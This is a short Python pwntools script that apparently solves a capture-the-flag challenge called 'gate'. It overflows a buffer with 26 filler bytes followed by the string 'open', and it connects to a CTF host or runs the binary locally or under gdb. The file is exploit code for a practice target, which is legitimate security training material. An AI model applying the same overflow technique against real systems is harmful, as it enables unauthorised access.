#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./gate"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("nc.ctf.setodanote.net", 26501)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+364
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b""
payload += b"A" * 26
payload += b"open"

p.recvuntil("")
sleep(0.5)
p.sendline(payload)

p.interactive()
